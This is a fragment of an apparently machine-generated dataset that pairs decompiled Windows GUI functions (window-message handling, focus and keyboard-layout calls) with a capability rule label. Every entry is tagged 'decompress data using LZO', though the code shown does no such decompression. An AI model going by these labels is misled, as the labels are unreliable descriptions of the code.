fcn.004054c0();\n            var_34h = var_34h + -1;\n        } while (var_34h != NULL);\n    }\n    *in_FS_OFFSET = uStack52;\n    _auStack44 = 0x4369fc;\n    var_2ch = 0x4369dc;\n    fcn.00404640();\n    var_2ch = 0x4369e4;\n    fcn.00404640();\n    var_2ch = 0x4369ec;\n    fcn.00404640();\n    var_2ch = 0x4369f4;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 3025
    },
    "0043786c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x00437902)\n// WARNING: Removing unreachable block (ram,0x0043791a)\n\nvoid __cdecl fcn.0043786c(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint16_t in_DX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack44 = &var_2h + 2;\n    uStack48 = 0x437997;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    if ((in_DX & 0x10) == 0) {\n        iVar1 = fcn.00436e3c();\n        if ((iVar1 != 0) && (iVar2 = fcn.004359b8(),  in_ECX < iVar2)) {\n            iVar1 = fcn.004359c8();\n        }\n    }\n    else {\n        puStack44 = &var_2h + 2;\n        sub.user32.dll_GetSubMenu();\n        iVar1 = fcn.00436e3c();\n        uStack60 = in_EAX;\n    }\n    if ((iVar1 != 0) && (*(iVar1 + 0x30) != 0)) {\n        fcn.00405654();\n        fcn.00405654();\n        fcn.00405654(0);\n        uVar3 = fcn.004058fc();\n        fcn.00405654(0, uVar3);\n        uVar3 = fcn.004058fc();\n        iVar1 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar3);\n        if (iVar1 == 2) {\n            fcn.0043879c();\n        }\n    }\n    *in_FS_OFFSET = uStack60;\n    uStack52 = 0x43799e;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 525
    },
    "004386ac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004386ac(uint param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    fcn.004054c0();\n    for (iVar3 = 1; iVar2 = fcn.0040572c(),  iVar3 <= iVar2; iVar3 = iVar3 + 1) {\n        uVar1 = *(*param_2 + -1 + iVar3);\n        if ((*(*0x492ae0 + (uVar1 >> 3)) >> (uVar1 & 7) & 1) == 0) {\n            if (*(*param_2 + -1 + iVar3) == '&') {\n                if (*(*0x492b04 + 0xc) == '\\0') {\n                    bVar4 = false;\n                }\n                else {\n                    if (iVar3 < 2) {\n                        bVar4 = false;\n                    }\n                    else {\n                        iVar2 = *param_2;\n                        if (iVar2 != 0) {\n                            iVar2 = *(iVar2 + -4);\n                        }\n                        bVar4 = 1 < iVar2 - iVar3;\n                    }\n                    if (bVar4) {\n                        bVar4 = *(*param_2 + -2 + iVar3) == '(';\n                    }\n                    else {\n                        bVar4 = false;\n                    }\n                    if (bVar4) {\n                        bVar4 = *(*param_2 + 1 + iVar3) == ')';\n                    }\n                    else {\n                        bVar4 = false;\n                    }\n                }\n                if (bVar4) {\n                    fcn.004059a4();\n                }\n                else {\n                    fcn.004059a4();\n                }\n            }\n        }\n        else {\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "0043879c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0043879c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    fcn.0040546c();\n    iVar3 = 1;\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    if (0 < iVar1) {\n        do {\n            uVar2 = *(in_EAX + -1 + iVar3);\n            if ((*(*0x492ae0 + (uVar2 >> 3)) >> (uVar2 & 7) & 1) == 0) {\n                if (((*(in_EAX + -1 + iVar3) == '&') && (0 < iVar1 - iVar3)) &&\n                   (iVar3 = iVar3 + 1,  *(in_EAX + -1 + iVar3) != '&')) {\n                    fcn.00405654();\n                }\n            }\n            else {\n                iVar3 = iVar3 + 1;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 <= iVar1);\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "00438804": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0043884e)\n// WARNING: Removing unreachable block (ram,0x0043885a)\n\nvoid fcn.00438804(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x4388a7;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    fcn.004386ac();\n    fcn.004386ac();\n    uVar1 = fcn.004058fc(0);\n    uVar1 = fcn.004058fc(0, uVar1);\n    uVar2 = 0x400;\n    sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x4388ae);\n    return;\n}\n",
        "token_count": 262
    },
    "0043b6bc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b6bc(uint param_1, int32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1f) == '\\0') || (3 < *(param_2 + 4))) {\n    // switch table (8 cases) at 0x43b896\n        switch(*(param_2 + 4)) {\n        case 0:\n            fcn.0043ba34();\n            break;\n        case 1:\n            fcn.0043ba34();\n            break;\n        case 2:\n            fcn.0043b5c4();\n            fcn.0043ba34();\n            break;\n        case 3:\n            fcn.0043b5c4();\n            fcn.0043ba34();\n            break;\n        case 4:\n            if (*(in_EAX + 0x14) < 0x8000) {\n                fcn.0043ba34();\n            }\n            else {\n                fcn.0043b65c(&stack0xfffffffc);\n                fcn.0043ba34();\n            }\n            break;\n        case 5:\n            if (*(in_EAX + 0x1d) != '\\0') {\n                if (*(in_EAX + 0x14) < 0x8000) {\n                    fcn.0043ba34();\n                }\n                else {\n                    fcn.0043b65c(&stack0xfffffffc);\n                    fcn.0043ba34();\n                }\n            }\n            break;\n        case 6:\n            fcn.0043ba34();\n            break;\n        case 7:\n            fcn.0043ba34();\n        }\n    }\n    else {\n        if (*(param_2 + 4) < 2) {\n            iVar3 = *(in_EAX + 0x40);\n            var_10h = *(in_EAX + 8) % iVar3;\n        }\n        else if (*(param_2 + 4) - 2 < 2) {\n            iVar3 = *(in_EAX + 0x3c);\n            var_10h = *(in_EAX + 10) % iVar3;\n        }\n        else {\n            iVar3 = 0;\n            var_10h = 0;\n        }\n        var_14h = 0;\n        for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n            iVar2 = sub.kernel32.dll_GetTickCount_1();\n            if (iVar2 - var_14h < *(in_EAX + 0x20)) {\n                sub.kernel32.dll_Sleep_1(*(in_EAX + 0x20) - (iVar2 - var_14h));\n            }\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.0043ba34();\n            }\n            else if (iVar1 == 1) {\n                fcn.0043ba34();\n            }\n            else if (iVar1 == 2) {\n                fcn.0043ba34();\n            }\n            else if (iVar1 == 3) {\n                fcn.0043ba34();\n            }\n            (**(**(in_EAX + 4) + 0x8c))();\n            var_14h = iVar2;\n        }\n        if (0 < var_10h) {\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.0043ba34();\n            }\n            else if (iVar1 == 1) {\n                fcn.0043ba34();\n            }\n            else if (iVar1 == 2) {\n                fcn.0043ba34();\n            }\n            else if (iVar1 == 3) {\n                fcn.0043ba34();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 899
    },
    "00442d48": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00442dac)\n// WARNING: Removing unreachable block (ram,0x00442dcc)\n// WARNING: Removing unreachable block (ram,0x00442dd5)\n// WARNING: Removing unreachable block (ram,0x00442dda)\n// WARNING: Removing unreachable block (ram,0x00442de7)\n// WARNING: Removing unreachable block (ram,0x00442dec)\n// WARNING: Removing unreachable block (ram,0x00442df9)\n\nvoid __fastcall fcn.00442d48(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x442e1d;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    (**(*in_EAX + -0x10))();\n    if (**(param_2 + 8) == 0xc) {\n        fcn.0044fc34();\n        fcn.0040555c();\n        fcn.004058fc();\n        fcn.0044fc44();\n        fcn.0044fcf4();\n    }\n    else if (**(param_2 + 8) == 0xb00b) {\n        fcn.0043d824();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x442e24;\n    uStack28 = 0x442e1c;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 378
    },
    "00444ce4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00444ce4(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    code **ppcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x44536f;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack36;\n    param_2[3] = 0;\n    iVar7 = *(*(in_EAX + 0xb0) + 8);\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar7 + -1) {\n        do {\n            puStack28 = puVar1;\n            ppcVar3 = fcn.004197d8();\n            cVar2 = (**ppcVar3)();\n            if (cVar2 != '\\0') {\n                *in_FS_OFFSET = iStack36;\n                return;\n            }\n            iVar7 = iVar7 + -1;\n            puVar1 = puStack28;\n        } while (iVar7 != 0);\n    }\n    fcn.00444b98();\n    iVar7 = *param_2;\n    if (0x53 < iVar7) {\n        if (iVar7 < 0xb018) {\n            if (iVar7 == 0xb017) {\n                if ((*(in_EAX + 0x44) != 0) && (iVar7 = fcn.00457a28(),  iVar7 != 0)) {\n                    uVar5 = fcn.00457a28();\n                    iVar7 = sub.user32.dll_IsWindowEnabled(uVar5);\n                    if (iVar7 != 0) {\n                        uVar5 = fcn.00457a28();\n                        iVar7 = sub.user32.dll_IsWindowVisible(uVar5);\n                        if (iVar7 != 0) {\n                            *0x4914ec = 0;\n                            uVar5 = sub.user32.dll_GetFocus();\n                            uVar6 = fcn.00457a28();\n                            sub.user32.dll_SetFocus(uVar6);\n                            fcn.00450f7c(param_2[2]);\n                            sub.user32.dll_SetFocus(uVar5);\n                            *0x4914ec = 1;\n                            param_2[3] = 1;\n                        }\n                    }\n                }\n                goto code_r0x00445365;\n            }\n            if (iVar7 < 0xb001) {\n                if (iVar7 == 0xb000) {\n                    if (*(in_EAX + 0x13a) != 0) {\n                        (**(in_EAX + 0x138))();\n                    }\n                    if ((*(*0x497c14 + 0x44) != 0) && (cVar2 = fcn.0044764c(),  cVar2 != '\\0')) {\n                        iStack36 = fcn.00457a28();\n                        iVar7 = sub.user32.dll_IsWindowEnabled();\n                        if ((iVar7 == 0) && (iVar7 = fcn.00457a28(),  iVar7 != *0x497c3c)) {\n                            iStack36 = *0x497c3c;\n                            sub.user32.dll_SetFocus();\n                        }\n                    }\n                    *0x497c3c = 0;\n                    goto code_r0x00445365;\n                }\n                if (iVar7 == 0x112) {\n                    if ((param_2[1] & 0xfff0U) == 0xf020) {\n                        fcn.004453a8();\n                    }\n                    else if ((param_2[1] & 0xfff0U) == 0xf120) {\n                        fcn.00445488();\n                    }\n                    else {\n                        fcn.00444c5c(&stack0xfffffffc);\n                    }\n                    goto code_r0x00445365;\n                }\n                if (iVar7 - 0x132U < 7) {\n                    iVar7 = sub.user32.dll_SendMessageA(param_2[2], iVar7 + 0xbc00, param_2[1], param_2[2]);\n                    param_2[3] = iVar7;\n                    goto code_r0x00445365;\n                }\n                if (iVar7 - 0x132U == 0x1e8) {\n                    fcn.00431640();\n                    fcn.004317a4();\n                    goto code_r0x00445365;\n                }\n            }\n            else {\n                if (iVar7 == 0xb001) {\n                    *0x497c3c = sub.user32.dll_GetLastActivePopup(*(in_EAX + 0x30));\n                    if (*(in_EAX + 0x132) != 0) {\n                        (**(in_EAX + 0x130))();\n                    }\n                    goto code_r0x00445365;\n                }\n                if (iVar7 == 0xb016) {\n                    cVar2 = fcn.00445834();\n                    if (cVar2 != '\\0') {\n                        param_2[3] = 1;\n                    }\n                    goto code_r0x00445365;\n                }\n            }\n        }\n        else if (iVar7 < 0xb021) {\n            if (iVar7 == 0xb020) {\n                if (param_2[1] == 0) {\n                    fcn.00445a8c(*param_2[2], param_2[2][1]);\n                }\n                else {\n                    fcn.00445ae8(*param_2[2], param_2[2][1]);\n                }\n                goto code_r0x00445365;\n            }\n            if (iVar7 == 0xb01a) {\n                iVar7 = fcn.0043ab74();\n                if (((iVar7 == 0) && (iVar7 = sub.user32.dll_GetFocus(),  iVar7 == *(in_EAX + 0x30))) &&\n                   (iVar7 = fcn.0043ae98(),  iVar7 != 0)) {\n                    sub.user32.dll_SetFocus(iVar7);\n                }\n                goto code_r0x00445365;\n            }\n            if (iVar7 == 0xb01f) goto code_r0x00445292;\n        }\n        else {\n            if (iVar7 == 0xb031) {\n                if (param_2[1] == 1) {\n                    param_2[3] = *(in_EAX + 0xb8);\n                }\n                else {\n                    *(in_EAX + 0xb8) = param_2[2];\n                }\n                goto code_r0x00445365;\n            }\n            if (iVar7 - 0xb03fU < 2) {\n                uVar4 = fcn.0044709c();\n                param_2[3] = uVar4 & 0x7f;\n                goto code_r0x00445365;\n            }\n        }\n        goto code_r0x0044535e;\n    }\n    if (iVar7 == 0x53) {\ncode_r0x00445292:\n        fcn.00445eb8();\n        goto code_r0x00445365;\n    }\n    if (iVar7 < 0x12) {\n    // switch table (17 cases) at 0x444d88\n        switch(iVar7) {\n        case 0:\n            fcn.0041f660();\n            break;\n        case 1:\n        case 2:\n        case 3:\n        case 4:\n        case 6:\n        case 8:\n        case 9:\n        case 0xb:\n        case 0xc:\n        case 0xd:\n        case 0xe:\n            goto code_r0x0044535e;\n        case 5:\n            if (param_2[1] == 1) {\n                *0x497c24 = 1;\n            }\n            break;\n        case 7:\n            sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01a, 0, 0);\n            fcn.00444c5c(&stack0xfffffffc);\n            break;\n        case 10:\n            if (param_2[1] == 0) {\n                fcn.00444c5c(&stack0xfffffffc);\n                if ((*(in_EAX + 0xb4) == 0) && (*0x491504 == '\\0')) {\n                    uVar5 = fcn.0043ad38();\n                    *(in_EAX + 0xb4) = uVar5;\n                }\n                fcn.00444850();\n            }\n            else {\n                if ((*0x491504 == '\\0') && (fcn.004448a8(),  *(in_EAX + 0xb4) != 0)) {\n                    fcn.0043adfc();\n                    *(in_EAX + 0xb4) = 0;\n                }\n                fcn.00444c5c(&stack0xfffffffc);\n            }\n            break;\n        case 0xf:\n            iVar7 = fcn.0043ab74();\n            if (iVar7 == 0) {\n                fcn.00444c5c(&stack0xfffffffc);\n            }\n            else {\n                fcn.00444c98(&stack0xfffffffc);\n            }\n            break;\n        case 0x10:\n            if (*(in_EAX + 0x44) != 0) {\n                fcn.00441e1c();\n            }\n            break;\n        default:\n            param_2[3] = 1;\n        }\n    }\n    else {\n        if (iVar7 < 0x1d) {\n            if (iVar7 == 0x1c) {\n                fcn.00444c5c(&stack0xfffffffc);\n                *(in_EAX + 0xa5) = '\\x01' - (param_2[1] == 0);\n                if (param_2[1] == 0) {\n                    fcn.00444848();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb001, 0, 0);\n                }\n                else {\n                    fcn.004448a8();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb000, 0, 0);\n                }\n                goto code_r0x00445365;\n            }\n            if (iVar7 == 0x14) {\n                *param_2 = 0x27;\n                fcn.00444c5c(&stack0xfffffffc);\n                goto code_r0x00445365;\n            }\n            if (iVar7 == 0x16) {\n                if (param_2[1] != 0) {\n                    fcn.0040f294();\n                    fcn.00405378();\n                }\n                goto code_r0x00445365;\n            }\n            if (iVar7 == 0x1a) {\n                fcn.0045cab4();\n                fcn.00444bf0();\n                fcn.00444c5c(&stack0xfffffffc);\n                goto code_r0x00445365;\n            }\n        }\n        else {\n            if (iVar7 == 0x1d) {\n                fcn.00443ddc();\n                fcn.00444c5c(&stack0xfffffffc);\n                goto code_r0x00445365;\n            }\n            if (iVar7 == 0x37) {\n                iVar7 = fcn.0044538c();\n                param_2[3] = iVar7;\n                goto code_r0x00445365;\n            }\n        }\ncode_r0x0044535e:\n        fcn.00444c5c(&stack0xfffffffc);\n    }\ncode_r0x00445365:\n    *in_FS_OFFSET = iStack36;\n    return;\n}\n",
        "token_count": 2647
    },
    "004455f4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004455f4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar auStack268 [244];\n    int32_t iStack24;\n    \n    if ((*(in_EAX + 0xac) == '\\0') || (cVar1 = fcn.0044764c(),  cVar1 != '\\0')) {\n        fcn.004054c0();\n        return;\n    }\n    sub.user32.dll_GetWindowTextA(*(in_EAX + 0x30), auStack268, 0x100);\n    fcn.0040555c();\n    iStack24 = *param_2;\n    iVar2 = iStack24;\n    if (iStack24 != 0) {\n        iVar2 = *(iStack24 + -4);\n    }\n    if (iVar2 != 0) {\n        return;\n    }\n    fcn.004054c0();\n    return;\n}\n",
        "token_count": 223
    },
    "00454b24": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454b24(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    int32_t iStack72;\n    uint uVar6;\n    uint arg_ch;\n    uint var_34h;\n    uint lpEventTrack;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *param_2;\n    if (iVar4 < 0x100) {\n        if (0x1f < iVar4) {\n            if (iVar4 == 0x21) {\n                cVar1 = fcn.00454924();\n                if (cVar1 != '\\0') {\n                    if (param_2[3] != 0) {\n                        return;\n                    }\n                    cVar1 = fcn.00457d34();\n                    if (cVar1 == '\\0') {\n                        return;\n                    }\n                    fcn.00451058();\n                    return;\n                }\n            }\n            else if (iVar4 == 0x84) {\n                fcn.00451058();\n                if (param_2[3] != -1) {\n                    return;\n                }\n                arg_ch = 0;\n                uVar6 = 0;\n                iStack72 = 0x454ceb;\n                fcn.0044f804();\n                iStack72 = 0x454cf8;\n                iVar4 = fcn.00454860(uVar6, arg_ch);\n                if (iVar4 == 0) {\n                    return;\n                }\n                param_2[3] = 1;\n                return;\n            }\n            goto code_r0x00455018;\n        }\n        if (iVar4 == 0x1f) {\n            iVar4 = fcn.00457a28();\n            iVar5 = sub.user32.dll_GetCapture();\n            if (((iVar4 == iVar5) && (*0x4916f4 != 0)) && (*(*0x4916f4 + 0x30) == in_EAX)) {\n                fcn.00450f7c(0);\n            }\n            goto code_r0x00455018;\n        }\n        if (iVar4 == 7) {\n            piVar3 = fcn.0043b1a8();\n            if (((piVar3 != NULL) && (((*(piVar3 + 7) & 0x10) == 0 || (piVar3[0xc] == 0)))) &&\n               (cVar1 = (**(*piVar3 + 0xf8))(),  cVar1 == '\\0')) {\n                return;\n            }\n            goto code_r0x00455018;\n        }\n        if (iVar4 != 8) goto code_r0x00455018;\n        uVar2 = *(in_EAX + 0x15) & 0x20;\n    }\n    else {\n        if (0xb047 < iVar4) {\n            if (iVar4 == 0xb04a) {\n                if (param_2[1] != '\\0') {\n                    fcn.00458dc8();\n                }\n                iStack72 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb8;\n                (**(*in_EAX + 0xb0))();\n                *in_FS_OFFSET = iStack72;\n                if (param_2[1] != '\\0') {\n                    fcn.00458dc8();\n                }\n                return;\n            }\n            if (((iVar4 == 0xb04e) && ((*(in_EAX + 7) & 0x10) != 0)) && (**0x492b00 != NULL)) {\n                iStack72 = 0x454bf6;\n                iStack72 = fcn.00457a28();\n                (***0x492b00)();\n                fcn.00457a28();\n                sub.user32.dll_SetWindowPos();\n            }\n            goto code_r0x00455018;\n        }\n        if (iVar4 == 0xb047) {\n            piVar3 = fcn.0043b1a8();\n            if ((piVar3 != NULL) && (piVar3 != in_EAX)) {\n                fcn.00450f7c(param_2[2]);\n            }\n            goto code_r0x00455018;\n        }\n        if (9 < iVar4 - 0x100U) {\n            if (iVar4 - 0x200U < 0xb) {\n                if (iVar4 == 0x200) {\n                    fcn.00418360();\n                    fcn.0044f754();\n                    iVar4 = fcn.0044ca70();\n                    *0x4916f4 = iVar4;\n                    if (iVar4 == 0) {\n                        iVar4 = fcn.0044e23c();\n                    }\n                    if (iVar4 != in_EAX[0x8f]) {\n                        if ((((in_EAX[0x8f] != 0) && (*0x4916f4 == 0)) ||\n                            ((*0x4916f4 != 0 && (in_EAX[0x8f] == *0x4916f4)))) ||\n                           ((*0x4916f4 != 0 && (*(*0x4916f4 + 0x30) == in_EAX[0x8f])))) {\n                            fcn.00450f7c(0);\n                        }\n                        if (in_EAX[0x8f] != 0) {\n                            fcn.0041fb4c();\n                        }\n                        in_EAX[0x8f] = iVar4;\n                        if (iVar4 != 0) {\n                            fcn.0041f90c();\n                        }\n                        if (((in_EAX[0x8f] != 0) && (*0x4916f4 == 0)) ||\n                           ((*0x4916f4 != 0 && (in_EAX[0x8f] == *0x4916f4)))) {\n                            iStack72 = 0x454e93;\n                            fcn.00450f7c(0);\n                        }\n                    }\n                    if (*(in_EAX + 0x8e) == '\\0') {\n                        *(in_EAX + 0x8e) = 1;\n                        fcn.00457a28();\n                        iStack72 = 0x454ed2;\n                        sub.comctl32.dll__TrackMouseEvent();\n                    }\n                }\n                cVar1 = fcn.00454a70();\n                if (cVar1 != '\\0') {\n                    if (param_2[3] != 0) {\n                        return;\n                    }\n                    cVar1 = fcn.00457d34();\n                    if (cVar1 == '\\0') {\n                        return;\n                    }\n                    iStack72 = param_2[1];\n                    uVar6 = fcn.00457a28(*param_2);\n                    sub.user32.dll_DefWindowProcA(uVar6);\n                    return;\n                }\n            }\n            else if (iVar4 - 0x200U == 0xa3) {\n                *(in_EAX + 0x8e) = 0;\n                if (in_EAX[0x8f] == 0) {\n                    fcn.00450f7c(0);\n                }\n                else {\n                    fcn.00450f7c(0);\n                }\n                in_EAX[0x8f] = 0;\n            }\n            goto code_r0x00455018;\n        }\n        uVar2 = fcn.004504f0();\n    }\n    if (uVar2 != 0) {\n        return;\n    }\ncode_r0x00455018:\n    fcn.00451058();\n    if (*param_2 == 0x128) {\n        (**(*in_EAX + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 1793
    },
    "00456030": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00456095)\n\nvoid fcn.00456030(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc4;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45614f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x492b04 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x1bc) != 0) {\n            fcn.00443610();\n            iVar3 = *(in_EAX + 0x1bc);\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar2 = fcn.004058fc(0);\n            uVar2 = fcn.004058fc(iVar3, uVar2);\n            in_stack_ffffffc4 = 0x400;\n            iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            puVar1 = puStack28;\n            if (iVar3 != 2) {\n                piVar4 = fcn.00443410();\n                iVar3 = (**(*piVar4 + 0x14))();\n                puVar1 = puStack28;\n                if (iVar3 != 0) {\n                    in_stack_ffffffc4 = *(**0x492ad4 + 0x3c);\n                    if (*(in_EAX + 0x1b8) != '\\0') {\n                        piVar4 = fcn.00443410();\n                        iVar3 = (**(*piVar4 + 0x54))();\n                        if (-1 < iVar3) {\n                            piVar4 = fcn.00443410();\n                            in_stack_ffffffc4 = (**(*piVar4 + 0x18))();\n                        }\n                    }\n                    sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffc4, 1);\n                    puVar1 = puStack28;\n                }\n            }\n        }\n        puStack28 = puVar1;\n        fcn.00457a28();\n        fcn.0045cd9c();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.0040546c(0x456156);\n    return;\n}\n",
        "token_count": 627
    },
    "00456160": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004561c1)\n\nvoid fcn.00456160(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffbc;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45622f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x492b04 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x1bc) != 0) {\n            fcn.00443610();\n            iVar3 = *(in_EAX + 0x1bc);\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar2 = fcn.004058fc(0);\n            uVar2 = fcn.004058fc(iVar3, uVar2);\n            iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            puVar1 = puStack28;\n            if (iVar3 != 2) {\n                in_stack_ffffffbc = *(**0x492ad4 + 0x3c);\n                sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffbc, 1);\n                puVar1 = puStack28;\n            }\n        }\n        puStack28 = puVar1;\n        puVar1 = puStack28;\n        if (*(in_EAX + 0x1b8) == '\\0') {\n            fcn.00457a28();\n            fcn.0045cd80();\n            puVar1 = puStack28;\n        }\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffbc;\n    fcn.0040546c(0x456236);\n    return;\n}\n",
        "token_count": 490
    },
    "00458be4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458be4(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043b1a8();\n    if (iVar1 == 0) {\n        return;\n    }\n    if (param_2 != 9) {\n        if (param_2 == 0x12) {\n            fcn.00450f7c(0);\n            return;\n        }\n        if (3 < param_2 - 0x25U) {\n            return;\n        }\n    }\n    fcn.00450f7c(0);\n    return;\n}\n",
        "token_count": 141
    },
    "004591f8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
